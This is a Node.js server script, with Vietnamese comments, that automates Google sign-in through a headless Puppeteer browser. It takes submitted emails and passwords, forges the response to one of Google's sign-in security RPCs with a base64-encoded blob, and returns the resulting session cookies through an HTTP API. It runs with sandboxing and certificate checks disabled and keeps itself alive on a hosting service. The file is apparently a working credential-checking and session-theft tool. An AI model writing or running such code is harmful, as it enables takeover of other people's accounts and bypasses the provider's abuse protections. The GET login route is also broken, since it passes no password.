const express = require('express')
const puppeteer = require('puppeteer-core')
const axios = require('axios')

const app = express()
app.use(express.json())
app.use(express.urlencoded({ extended: true }))

let page = null
let mLoaded = false
let mID = null
let mStart = 'Orbita Browser is running'
let mUrl = null
let mHeaders = null
let mPostData = null

// Start Browser
async function startBrowser() {
  try {
    const browser = await puppeteer.launch({
      headless: 'new', // or false if you want to see the browser UI
      args: [
        '--no-sandbox',
        '--disable-notifications',
        '--disable-setuid-sandbox',
        '--ignore-certificate-errors',
        '--ignore-certificate-errors-skip-list',
        '--disable-dev-shm-usage'
      ],
      executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || puppeteer.executablePath(),
    })

    page = (await browser.pages())[0]

    page.on('dialog', async dialog => {
      if (dialog.type() === "beforeunload") {
        await dialog.accept()
      }
    })

    await page.setRequestInterception(true)

    page.on('request', request => {
      try {
        if (request.url().startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=V1UmUe')) {
          mUrl = request.url()
          mHeaders = request.headers()
          mPostData = request.postData()
          let contentType = 'application/json; charset=utf-8'
          let output = decode('KV19JwoKMTk1CltbIndyYi5mciIsIlYxVW1VZSIsIltudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzExXV0iLG51bGwsbnVsbCxudWxsLCJnZW5lcmljIl0sWyJkaSIsNThdLFsiYWYuaHR0cHJtIiw1OCwiLTI1OTg0NDI2NDQ4NDcyOTY2MTMiLDY1XV0KMjUKW1siZSIsNCxudWxsLG51bGwsMjMxXV0K')

          request.respond({
            ok: true,
            status: 200,
            contentType,
            body: output,
          })
        } else {
          request.continue()
        }
      } catch (error) {
        request.continue()
      }
    })

    console.log('Browser Load Success')

    await loadLoginPage()

    mLoaded = true

    console.log('Page Load Success')
  } catch (error) {
    console.log('Browser Error: ' + error)
  }
}

async function loadLoginPage() {
  for (let i = 0; i < 3; i++) {
    try {
      await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { timeout: 60000 })
      await delay(500)
      break
    } catch (error) {
      console.log('Error loading login page, retry:', i + 1)
    }
  }
}

async function pageReload() {
  mLoaded = false
  console.log('Page Reloading...')
  await loadLoginPage()
  console.log('Page Reload Success')
  mLoaded = true
}

async function updateStatus() {
  try {
    if (mID) {
      await axios.get('https://' + mID + '.onrender.com')
    }
  } catch (error) {
    // Ignore errors
  }
}

async function getLoginToken(email, password) {
  try {
    console.log('[getLoginToken] Start with email:', email)
    await loadingRemove()
    mUrl = null
    mHeaders = null
    mPostData = null
    // Điền email
    await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { timeout: 60000 })
    await page.waitForSelector('input[type="email"],input#identifierId', { timeout: 10000 })
    await page.type('input[type="email"],input#identifierId', email, { delay: 50 })
    // Click Next
    await page.waitForSelector('#identifierNext', { timeout: 10000 })
    await page.click('#identifierNext')
    // Chờ password
    await page.waitForTimeout(1000)
    await page.waitForSelector('input[type="password"]', { timeout: 10000 })
    await page.type('input[type="password"]', password, { delay: 50 })
    // Click Next
    await page.waitForSelector('#passwordNext', { timeout: 10000 })
    await page.click('#passwordNext')
    // Chờ login thành công hoặc lỗi
    await page.waitForTimeout(3000)
    // Lấy url hiện tại
    const currentUrl = page.url()
    // Lấy cookie hiện tại
    const cookies = await page.cookies()
    // Kiểm tra login thành công
    if (currentUrl.includes('myaccount.google.com')) {
      return { status: 1, message: 'Login success', email, url: currentUrl, cookies }
    }
    // Kiểm tra lỗi
    const errorText = await page.evaluate(() => {
      let el = document.querySelector('div.o6cuMc')
      return el ? el.innerText : null
    })
    if (errorText) {
      return { status: 0, error: errorText, url: currentUrl, cookies }
    }
    return { status: 0, error: 'Unknown error', url: currentUrl, cookies }
  } catch (error) {
    console.log('[getLoginToken] catch error:', error)
    return { status: 0, error: error.toString() }
  }
}

async function loadingRemove() {
  await page.evaluate(() => {
    let root = document.querySelector('div.kPY6ve')
    if (root) root.remove()
    root = document.querySelector('div.Ih3FE')
    if (root) root.remove()
  })
}

function decode(text) {
  return Buffer.from(text, 'base64').toString('ascii')
}

function delay(time) {
  return new Promise(resolve => setTimeout(resolve, time))
}

// Express routes

app.post('/login', async (req, res) => {
  if (req.body) {
    const email = req.body.email
    const password = req.body.password
    if (email && password) {
      if (mLoaded) {
        const mData = await getLoginToken(email, password)
        res.json(mData)
      } else {
        await delay(10000)
        res.json({ status: -1 })
      }
    } else {
      res.json({ status: -1 })
    }
  } else {
    res.json({ status: -1 })
  }
})

app.get('/login', async (req, res) => {
  if (req.query) {
    const number = req.query.number
    if (number) {
      if (mLoaded) {
        const mData = await getLoginToken(number)
        res.json(mData)
      } else {
        await delay(10000)
        res.json({ status: -1 })
      }
    } else {
      res.json({ status: -1 })
    }
  } else {
    res.json({ status: -1 })
  }
})

app.get('/reload', async (req, res) => {
  await pageReload()
  res.send('Reload Success')
})

app.get('/', async (req, res) => {
  if (mID == null) {
    try {
      let url = req.query.url
      if (!url) {
        let host = req.hostname
        if (host.endsWith('onrender.com')) {
          url = host.replace('.onrender.com', '')
        }
      }

      if (url && url !== 'localhost') {
        mID = url
      }
    } catch (error) {
      // ignore
    }
  }

  res.send(mStart)
})

// Start browser and intervals

startBrowser()

setInterval(async () => {
  await pageReload()
}, 30 * 60 * 1000) // 30 minutes

setInterval(async () => {
  await updateStatus()
}, 60000) // 1 minute

// Listen port
const PORT = process.env.PORT || 3000
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`)
})
